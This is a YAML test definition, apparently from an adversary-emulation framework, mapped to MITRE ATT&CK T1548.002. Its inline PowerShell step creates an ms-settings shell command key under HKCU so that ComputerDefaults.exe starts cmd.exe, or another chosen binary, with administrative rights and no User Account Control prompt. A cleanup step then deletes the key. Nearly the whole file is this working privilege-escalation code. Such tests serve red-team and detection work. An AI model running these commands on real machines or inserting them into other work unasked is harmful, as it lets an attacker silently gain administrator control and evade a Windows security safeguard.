api_version: "2.0"
name: Bypass UAC using ComputerDefaults (PowerShell)
description: |
    PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
    Upon execution administrative command prompt should open
args:
    - name: executable_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: 3c51abf2-44bf-42d8-9111-dc96ff66750f
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-using-computerdefaults-(powershell)
      inline: |
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "{{.Args.executable_binary}}" -Force
        Start-Process "C:\Windows\System32\ComputerDefaults.exe"
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
        executor: powershell
